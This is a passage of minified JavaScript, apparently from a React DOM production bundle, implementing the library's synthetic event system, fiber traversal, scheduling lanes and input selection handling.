pr(e,t){if(e.indexOf("-")===-1)return typeof t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Ue=null;function Wt(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var ge=null,Or=null,Ot=null;function rr(e){if(e=ya(e)){if(typeof ge!="function")throw Error(n(280));var t=e.stateNode;t&&(t=pi(t),ge(e.stateNode,e.type,t))}}function ln(e){Or?Ot?Ot.push(e):Ot=[e]:Or=e}function pt(){if(Or){var e=Or,t=Ot;if(Ot=Or=null,rr(e),t)for(e=0;e<t.length;e++)rr(t[e])}}function Ir(e,t){return e(t)}function on(){}var Us=!1;function cn(e,t,i){if(Us)return e(t,i);Us=!0;try{return Ir(e,t,i)}finally{Us=!1,(Or!==null||Ot!==null)&&(on(),pt())}}function mr(e,t){var i=e.stateNode;if(i===null)return null;var o=pi(i);if(o===null)return null;i=o[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(o=!o.disabled)||(e=e.type,o=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!o;break e;default:e=!1}if(e)return null;if(i&&typeof i!="function")throw Error(n(231,t,typeof i));return i}var Ls=!1;if(m)try{var Wr={};Object.defineProperty(Wr,"passive",{get:function(){Ls=!0}}),window.addEventListener("test",Wr,Wr),window.removeEventListener("test",Wr,Wr)}catch{Ls=!1}function Jn(e,t,i,o,d,f,g,b,N){var $=Array.prototype.slice.call(arguments,3);try{t.apply(i,$)}catch(V){this.onError(V)}}var qr=!1,$r=null,cs=!1,Ms=null,Yn={onError:function(e){qr=!0,$r=e}};function Qn(e,t,i,o,d,f,g,b,N){qr=!1,$r=null,Jn.apply(Yn,arguments)}function Xn(e,t,i,o,d,f,g,b,N){if(Qn.apply(this,arguments),qr){if(qr){var $=$r;qr=!1,$r=null}else throw Error(n(198));cs||(cs=!0,Ms=$)}}function qt(e){var t=e,i=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(i=t.return),e=t.return;while(e)}return t.tag===3?i:null}function us(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function un(e){if(qt(e)!==e)throw Error(n(188))}function p(e){var t=e.alternate;if(!t){if(t=qt(e),t===null)throw Error(n(188));return t!==e?null:e}for(var i=e,o=t;;){var d=i.return;if(d===null)break;var f=d.alternate;if(f===null){if(o=d.return,o!==null){i=o;continue}break}if(d.child===f.child){for(f=d.child;f;){if(f===i)return un(d),e;if(f===o)return un(d),t;f=f.sibling}throw Error(n(188))}if(i.return!==o.return)i=d,o=f;else{for(var g=!1,b=d.child;b;){if(b===i){g=!0,i=d,o=f;break}if(b===o){g=!0,o=d,i=f;break}b=b.sibling}if(!g){for(b=f.child;b;){if(b===i){g=!0,i=f,o=d;break}if(b===o){g=!0,o=f,i=d;break}b=b.sibling}if(!g)throw Error(n(189))}}if(i.alternate!==o)throw Error(n(190))}if(i.tag!==3)throw Error(n(188));return i.stateNode.current===i?e:t}function O(e){return e=p(e),e!==null?L(e):null}function L(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=L(e);if(t!==null)return t;e=e.sibling}return null}var W=r.unstable_scheduleCallback,G=r.unstable_cancelCallback,Tt=r.unstable_shouldYield,Le=r.unstable_requestPaint,Te=r.unstable_now,Zn=r.unstable_getCurrentPriorityLevel,Vr=r.unstable_ImmediatePriority,Ge=r.unstable_UserBlockingPriority,Be=r.unstable_NormalPriority,Vt=r.unstable_LowPriority,We=r.unstable_IdlePriority,Ja=null,Dr=null;function Yf(e){if(Dr&&typeof Dr.onCommitFiberRoot=="function")try{Dr.onCommitFiberRoot(Ja,e,void 0,(e.current.flags&128)===128)}catch{}}var xr=Math.clz32?Math.clz32:Zf,Qf=Math.log,Xf=Math.LN2;function Zf(e){return e>>>=0,e===0?32:31-(Qf(e)/Xf|0)|0}var Ya=64,Qa=4194304;function ea(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Xa(e,t){var i=e.pendingLanes;if(i===0)return 0;var o=0,d=e.suspendedLanes,f=e.pingedLanes,g=i&268435455;if(g!==0){var b=g&~d;b!==0?o=ea(b):(f&=g,f!==0&&(o=ea(f)))}else g=i&~d,g!==0?o=ea(g):f!==0&&(o=ea(f));if(o===0)return 0;if(t!==0&&t!==o&&(t&d)===0&&(d=o&-o,f=t&-t,d>=f||d===16&&(f&4194240)!==0))return t;if((o&4)!==0&&(o|=i&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=o;0<t;)i=31-xr(t),d=1<<i,o|=e[i],t&=~d;return o}function ep(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function tp(e,t){for(var i=e.suspendedLanes,o=e.pingedLanes,d=e.expirationTimes,f=e.pendingLanes;0<f;){var g=31-xr(f),b=1<<g,N=d[g];N===-1?((b&i)===0||(b&o)!==0)&&(d[g]=ep(b,t)):N<=t&&(e.expiredLanes|=b),f&=~b}}function Sl(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function tu(){var e=Ya;return Ya<<=1,(Ya&4194240)===0&&(Ya=64),e}function El(e){for(var t=[],i=0;31>i;i++)t.push(e);return t}function ta(e,t,i){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-xr(t),e[t]=i}function rp(e,t){var i=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var o=e.eventTimes;for(e=e.expirationTimes;0<i;){var d=31-xr(i),f=1<<d;t[d]=0,o[d]=-1,e[d]=-1,i&=~f}}function Cl(e,t){var i=e.entangledLanes|=t;for(e=e.entanglements;i;){var o=31-xr(i),d=1<<o;d&t|e[o]&t&&(e[o]|=t),i&=~d}}var Me=0;function ru(e){return e&=-e,1<e?4<e?(e&268435455)!==0?16:536870912:4:1}var su,Tl,nu,au,iu,Rl=!1,Za=[],ds=null,hs=null,fs=null,ra=new Map,sa=new Map,ps=[],sp="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function lu(e,t){switch(e){case"focusin":case"focusout":ds=null;break;case"dragenter":case"dragleave":hs=null;break;case"mouseover":case"mouseout":fs=null;break;case"pointerover":case"pointerout":ra.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":sa.delete(t.pointerId)}}function na(e,t,i,o,d,f){return e===null||e.nativeEvent!==f?(e={blockedOn:t,domEventName:i,eventSystemFlags:o,nativeEvent:f,targetContainers:[d]},t!==null&&(t=ya(t),t!==null&&Tl(t)),e):(e.eventSystemFlags|=o,t=e.targetContainers,d!==null&&t.indexOf(d)===-1&&t.push(d),e)}function np(e,t,i,o,d){switch(t){case"focusin":return ds=na(ds,e,t,i,o,d),!0;case"dragenter":return hs=na(hs,e,t,i,o,d),!0;case"mouseover":return fs=na(fs,e,t,i,o,d),!0;case"pointerover":var f=d.pointerId;return ra.set(f,na(ra.get(f)||null,e,t,i,o,d)),!0;case"gotpointercapture":return f=d.pointerId,sa.set(f,na(sa.get(f)||null,e,t,i,o,d)),!0}return!1}function ou(e){var t=Fs(e.target);if(t!==null){var i=qt(t);if(i!==null){if(t=i.tag,t===13){if(t=us(i),t!==null){e.blockedOn=t,iu(e.priority,function(){nu(i)});return}}else if(t===3&&i.stateNode.current.memoizedState.isDehydrated){e.blockedOn=i.tag===3?i.stateNode.containerInfo:null;return}}}e.blockedOn=null}function ei(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var i=Al(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(i===null){i=e.nativeEvent;var o=new i.constructor(i.type,i);Ue=o,i.target.dispatchEvent(o),Ue=null}else return t=ya(i),t!==null&&Tl(t),e.blockedOn=i,!1;t.shift()}return!0}function cu(e,t,i){ei(e)&&i.delete(t)}function ap(){Rl=!1,ds!==null&&ei(ds)&&(ds=null),hs!==null&&ei(hs)&&(hs=null),fs!==null&&ei(fs)&&(fs=null),ra.forEach(cu),sa.forEach(cu)}function aa(e,t){e.blockedOn===t&&(e.blockedOn=null,Rl||(Rl=!0,r.unstable_scheduleCallback(r.unstable_NormalPriority,ap)))}function ia(e){function t(d){return aa(d,e)}if(0<Za.length){aa(Za[0],e);for(var i=1;i<Za.length;i++){var o=Za[i];o.blockedOn===e&&(o.blockedOn=null)}}for(ds!==null&&aa(ds,e),hs!==null&&aa(hs,e),fs!==null&&aa(fs,e),ra.forEach(t),sa.forEach(t),i=0;i<ps.length;i++)o=ps[i],o.blockedOn===e&&(o.blockedOn=null);for(;0<ps.length&&(i=ps[0],i.blockedOn===null);)ou(i),i.blockedOn===null&&ps.shift()}var dn=H.ReactCurrentBatchConfig,ti=!0;function ip(e,t,i,o){var d=Me,f=dn.transition;dn.transition=null;try{Me=1,Pl(e,t,i,o)}finally{Me=d,dn.transition=f}}function lp(e,t,i,o){var d=Me,f=dn.transition;dn.transition=null;try{Me=4,Pl(e,t,i,o)}finally{Me=d,dn.transition=f}}function Pl(e,t,i,o){if(ti){var d=Al(e,t,i,o);if(d===null)Jl(e,t,o,ri,i),lu(e,o);else if(np(d,e,t,i,o))o.stopPropagation();else if(lu(e,o),t&4&&-1<sp.indexOf(e)){for(;d!==null;){var f=ya(d);if(f!==null&&su(f),f=Al(e,t,i,o),f===null&&Jl(e,t,o,ri,i),f===d)break;d=f}d!==null&&o.stopPropagation()}else Jl(e,t,o,null,i)}}var ri=null;function Al(e,t,i,o){if(ri=null,e=Wt(o),e=Fs(e),e!==null)if(t=qt(e),t===null)e=null;else if(i=t.tag,i===13){if(e=us(t),e!==null)return e;e=null}else if(i===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return ri=e,null}function uu(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Zn()){case Vr:return 1;case Ge:return 4;case Be:case Vt:return 16;case We:return 536870912;default:return 16}default:return 16}}var ms=null,Ol=null,si=null;function du(){if(si)return si;var e,t=Ol,i=t.length,o,d="value"in ms?ms.value:ms.textContent,f=d.length;for(e=0;e<i&&t[e]===d[e];e++);var g=i-e;for(o=1;o<=g&&t[i-o]===d[f-o];o++);return si=d.slice(e,1<o?1-o:void 0)}function ni(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function ai(){return!0}function hu(){return!1}function Ht(e){function t(i,o,d,f,g){this._reactName=i,this._targetInst=d,this.type=o,this.nativeEvent=f,this.target=g,this.currentTarget=null;for(var b in e)e.hasOwnProperty(b)&&(i=e[b],this[b]=i?i(f):f[b]);return this.isDefaultPrevented=(f.defaultPrevented!=null?f.defaultPrevented:f.returnValue===!1)?ai:hu,this.isPropagationStopped=hu,this}return ee(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var i=this.nativeEvent;i&&(i.preventDefault?i.preventDefault():typeof i.returnValue!="unknown"&&(i.returnValue=!1),this.isDefaultPrevented=ai)},stopPropagation:function(){var i=this.nativeEvent;i&&(i.stopPropagation?i.stopPropagation():typeof i.cancelBubble!="unknown"&&(i.cancelBubble=!0),this.isPropagationStopped=ai)},persist:function(){},isPersistent:ai}),t}var hn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Il=Ht(hn),la=ee({},hn,{view:0,detail:0}),op=Ht(la),$l,Dl,oa,ii=ee({},la,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ul,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==oa&&(oa&&e.type==="mousemove"?($l=e.screenX-oa.screenX,Dl=e.screenY-oa.screenY):Dl=$l=0,oa=e),$l)},movementY:function(e){return"movementY"in e?e.movementY:Dl}}),fu=Ht(ii),cp=ee({},ii,{dataTransfer:0}),up=Ht(cp),dp=ee({},la,{relatedTarget:0}),zl=Ht(dp),hp=ee({},hn,{animationName:0,elapsedTime:0,pseudoElement:0}),fp=Ht(hp),pp=ee({},hn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),mp=Ht(pp),xp=ee({},hn,{data:0}),pu=Ht(xp),gp={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},yp={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},vp={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function wp(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=vp[e])?!!t[e]:!1}function Ul(){return wp}var bp=ee({},la,{key:function(e){if(e.key){var t=gp[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=ni(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?yp[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ul,charCode:function(e){return e.type==="keypress"?ni(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?ni(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),jp=Ht(bp),kp=ee({},ii,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),mu=Ht(kp),_p=ee({},la,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ul}),Np=Ht(_p),Sp=ee({},hn,{propertyName:0,elapsedTime:0,pseudoElement:0}),Ep=Ht(Sp),Cp=ee({},ii,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Tp=Ht(Cp),Rp=[9,13,27,32],Ll=m&&"CompositionEvent"in window,ca=null;m&&"documentMode"in document&&(ca=document.documentMode);var Pp=m&&"TextEvent"in window&&!ca,xu=m&&(!Ll||ca&&8<ca&&11>=ca),gu=" ",yu=!1;function vu(e,t){switch(e){case"keyup":return Rp.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function wu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var fn=!1;function Ap(e,t){switch(e){case"compositionend":return wu(t);case"keypress":return t.which!==32?null:(yu=!0,gu);case"textInput":return e=t.data,e===gu&&yu?null:e;default:return null}}function Op(e,t){if(fn)return e==="compositionend"||!Ll&&vu(e,t)?(e=du(),si=Ol=ms=null,fn=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return xu&&t.locale!=="ko"?null:t.data;default:return null}}var Ip={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function bu(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Ip[e.type]:t==="textarea"}function ju(e,t,i,o){ln(o),t=di(t,"onChange"),0<t.length&&(i=new Il("onChange","change",null,i,o),e.push({event:i,listeners:t}))}var ua=null,da=null;function $p(e){Mu(e,0)}function li(e){var t=yn(e);if(et(t))return e}function Dp(e,t){if(e==="change")return t}var ku=!1;if(m){var Ml;if(m){var Fl="oninput"in document;if(!Fl){var _u=document.createElement("div");_u.setAttribute("oninput","return;"),Fl=typeof _u.oninput=="function"}Ml=Fl}else Ml=!1;ku=Ml&&(!document.documentMode||9<document.documentMode)}function Nu(){ua&&(ua.detachEvent("onpropertychange",Su),da=ua=null)}function Su(e){if(e.propertyName==="value"&&li(da)){var t=[];ju(t,da,e,Wt(e)),cn($p,t)}}function zp(e,t,i){e==="focusin"?(Nu(),ua=t,da=i,ua.attachEvent("onpropertychange",Su)):e==="focusout"&&Nu()}function Up(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return li(da)}function Lp(e,t){if(e==="click")return li(t)}function Mp(e,t){if(e==="input"||e==="change")return li(t)}function Fp(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var gr=typeof Object.is=="function"?Object.is:Fp;function ha(e,t){if(gr(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var i=Object.keys(e),o=Object.keys(t);if(i.length!==o.length)return!1;for(o=0;o<i.length;o++){var d=i[o];if(!x.call(t,d)||!gr(e[d],t[d]))return!1}return!0}function Eu(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function Cu(e,t){var i=Eu(e);e=0;for(var o;i;){if(i.nodeType===3){if(o=e+i.textContent.length,e<=t&&o>=t)return{node:i,offset:t-e};e=o}e:{for(;i;){if(i.nextSibling){i=i.nextSibling;break e}i=i.parentNode}i=void 0}i=Eu(i)}}function Tu(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?Tu(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Ru(){for(var e=window,t=ct();t instanceof e.HTMLIFrameElement;){try{var i=typeof t.contentWindow.location.href=="string"}catch{i=!1}if(i)e=t.contentWindow;else break;t=ct(e.document)}return t}function Bl(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function Bp(e){var t=Ru(),i=e.focusedElem,o=e.selectionRange;if(t!==i&&i&&i.ownerDocument&&Tu(i.ownerDocument.documentElement,i)){if(o!==null&&Bl(i)){if(t=o.start,e=o.end,e===void 0&&(e=t),"selectionStart"in i)i.selectionStart=t,i.selectionEnd=Math.min(e,i.value.length);else if(e=(t=i.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var d=i.textContent.length,f=Math.min(o.start,d);o=o.end===void 0?f:Math.min(o.end,d),!e.extend&&f>o&&(d=o,o=f,f=d),d=Cu(i,f);var g=Cu(i,o);d&&g&&(e.rangeCount!==1||e.anchorNode!==d.node||e.anchorOffset!==d.offset||e.focusNode!==g.node||e.focusOffset!==g.offset)&&(t=t.createRange(),t.setStart(d.node,d.offset),e.removeAllRanges(),f>o?(e.addRange(t),e.extend(g.node,g.offset)):(t.setEnd(g.node,g.offset),e.addRange(t)))}}for(t=[],e=i;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof i.focus=="function"&&i.focus(),i=0;i<t.length;i++)e=t[i],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Wp=m&&"documentMode"in document&&11>=document.documentMode,pn=null,Wl=null,fa=null,ql=!1;function Pu(e,t,i){var o=i.window===i?i.document:i.nodeType===9?i:i.ownerDocument;ql||pn==null||pn!==ct(o)||(o=pn,"selectionStart"in o&&Bl(o)?o={start:o.selectionStart,end:o.selectionEnd}:(o=(o.ownerDocument&&o.ownerDocument.defaultView||window).getSelection(),o={anchorNode:o.anchorNode,anchorOffset:o.anchorOffset,focusNode:o.focusNode,focusOffset:o.focusOffset}),fa&&ha(fa,o)||(fa=o,o=di(Wl,"onSelect"),0<o.length&&(t=new Il("onSelect","select",null,t,i),e.push({event:t,listeners:o}),t.target=pn)))}function oi(e,t){var i={};return i[e.toLowerCase()]=t.toLowerCase(),i["Webkit"+e]="webkit"+t,i["Moz"+e]="moz"+t,i}var mn={animationend:oi("Animation","AnimationEnd"),animationiteration:oi("Animation","AnimationIteration"),animationstart:oi("Animation","AnimationStart"),transitionend:oi("Transition","TransitionEnd")},Vl={},Au={};m&&(Au=document.createElement("div").style,"AnimationEvent"in window||(delete mn.animationend.animation,delete mn.animationiteration.animation,delete mn.animationstart.animation),"TransitionEvent"in window||delete mn.transitionend.transition);function ci(e){if(Vl[e])return Vl[e];if(!mn[e])return e;var t=mn[e],i;for(i in t)if(t.hasOwnProperty(i)&&i in Au)return Vl[e]=t[i];return e}var Ou=ci("animationend"),Iu=ci("animationiteration"),$u=ci("animationstart"),Du=ci("transitionend"),zu=new Map,Uu="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function xs(e,t){zu.set(e,t),u(t,[e])}for(var Hl=0;Hl<Uu.length;Hl++){var Kl=Uu[Hl],qp=Kl.toLowerCase(),Vp=Kl[0].toUpperCase()+Kl.slice(1);xs(qp,"on"+Vp)}xs(Ou,"onAnimationEnd"),xs(Iu,"onAnimationIteration"),xs($u,"onAnimationStart"),xs("dblclick","onDoubleClick"),xs("focusin","onFocus"),xs("focusout","onBlur"),xs(Du,"onTransitionEnd"),h("onMouseEnter",["mouseout","mouseover"]),h("onMouseLeave",["mouseout","mouseover"]),h("onPointerEnter",["pointerout","pointerover"]),h("onPointerLeave",["pointerout","pointerover"]),u("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),u("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),u("onBeforeInput",["compositionend","keypress","textInput","paste"]),u("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),u("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),u("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var pa="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Hp=new Set("cancel close invalid load scroll toggle".split(" ").concat(pa));function Lu(e,t,i){var o=e.type||"unknown-event";e.currentTarget=i,Xn(o,t,void 0,e),e.currentTarget=null}function Mu(e,t){t=(t&4)!==0;for(var i=0;i<e.length;i++){var o=e[i],d=o.event;o=o.listeners;e:{var f=void 0;if(t)for(var g=o.length-1;0<=g;g--){var b=o[g],N=b.instance,$=b.currentTarget;if(b=b.listener,N!==f&&d.isPropagationStopped())break e;Lu(d,b,$),f=N}else for(g=0;g<o.length;g++){if(b=o[g],N=b.instance,$=b.currentTarget,b=b.listener,N!==f&&d.isPropagationStopped())break e;Lu(d,b,$),f=N}}}if(cs)throw e=Ms,cs=!1,Ms=null,e}function He(e,t){var i=t[to];i===void 0&&(i=t[to]=new Set);var o=e+"__bubble";i.has(o)||(Fu(t,e,2,!1),i.add(o))}function Gl(e,t,i){var o=0;t&&(o|=4),Fu(i,e,o,t)}var ui="_reactListening"+Math.random().toString(36).slice(2);function ma(e){if(!e[ui]){e[ui]=!0,l.forEach(function(i){i!=="selectionchange"&&(Hp.has(i)||Gl(i,!1,e),Gl(i,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[ui]||(t[ui]=!0,Gl("selectionchange",!1,t))}}function Fu(e,t,i,o){switch(uu(t)){case 1:var d=ip;break;case 4:d=lp;break;default:d=Pl}i=d.bind(null,t,i,e),d=void 0,!Ls||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(d=!0),o?d!==void 0?e.addEventListener(t,i,{capture:!0,passive:d}):e.addEventListener(t,i,!0):d!==void 0?e.addEventListener(t,i,{passive:d}):e.addEventListener(t,i,!1)}function Jl(e,t,i,o,d){var f=o;if((t&1)===0&&(t&2)===0&&o!==null)e:for(;;){if(o===null)return;var g=o.tag;if(g===3||g===4){var b=o.stateNode.containerInfo;if(b===d||b.nodeType===8&&b.parentNode===d)break;if(g===4)for(g=o.return;g!==null;){var N=g.tag;if((N===3||N===4)&&(N=g.stateNode.containerInfo,N===d||N.nodeType===8&&N.parentNode===d))return;g=g.return}for(;b!==null;){if(g=Fs(b),g===null)return;if(N=g.tag,N===5||N===6){o=f=g;continue e}b=b.parentNode}}o=o.return}cn(function(){var $=f,V=Wt(i),K=[];e:{var q=zu.get(e);if(q!==void 0){var re=Il,ie=e;switch(e){case"keypress":if(ni(i)===0)break e;case"keydown":case"keyup":re=jp;break;case"focusin":ie="focus",re=zl;break;case"focusout":ie="blur",re=zl;break;case"beforeblur":case"afterblur":re=zl;break;case"click":if(i.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":re=fu;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":re=up;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":re=Np;break;case Ou:case Iu:case $u:re=fp;break;case Du:re=Ep;break;case"scroll":re=op;break;case"wheel":re=Tp;break;case"copy":case"cut":case"paste":re=mp;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":re=mu}var le=(t&4)!==0,nt=!le&&e==="scroll",P=le?q!==null?q+"Capture":null:q;le=[];for(var C=$,A;C!==null;){A=C;var Y=A.stateNode;if(A.tag===5&&Y!==null&&(A=Y,P!==null&&(Y=mr(C,P),Y!=null&&le.push(xa(C,Y,A)))),nt)break;C=C.return}0<le.length&&(q=new re(q,ie,null,i,V),K.push({event:q,listeners:le}))}}if((t&7)===0){e:{if(q=e==="mouseover"||e==="pointerover",re=e==="mouseout"||e==="pointerout",q&&i!==Ue&&(ie=i.relatedTarget||i.fromElement)&&(Fs(ie)||ie[Hr]))break e;if((re||q)&&(q=V.window===V?V:(q=V.ownerDocument)?q.defaultView||q.parentWindow:window,re?(ie=i.relatedTarget||i.toElement,re=$,ie=ie?Fs(ie):null,ie!==null&&(nt=qt(ie),ie!==nt||ie.tag!==5&&ie.tag!==6)&&(ie=null)):(re=null,ie=$),re!==ie)){if(le=fu,Y="onMouseLeave",P="onMouseEnter",C="mouse",(e==="pointerout"||e==="pointerover")&&(le=mu,Y="onPointerLeave",P="onPointerEnter",C="pointer"),nt=re==null?q:yn(re),A=ie==null?q:yn(ie),q=new le(Y,C+"leave",re,i,V),q.target=nt,q.relatedTarget=A,Y=null,Fs(V)===$&&(le=new 